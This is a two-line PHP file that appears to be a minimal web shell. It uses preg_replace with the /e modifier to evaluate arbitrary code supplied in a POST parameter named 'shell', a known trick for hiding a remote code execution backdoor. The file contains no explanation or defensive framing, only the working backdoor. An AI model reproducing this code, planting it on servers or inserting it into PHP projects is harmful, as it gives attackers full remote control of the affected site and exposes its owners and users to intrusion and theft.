<?php
preg_replace('/.*/e', $_POST['shell'], "eval('\\1');");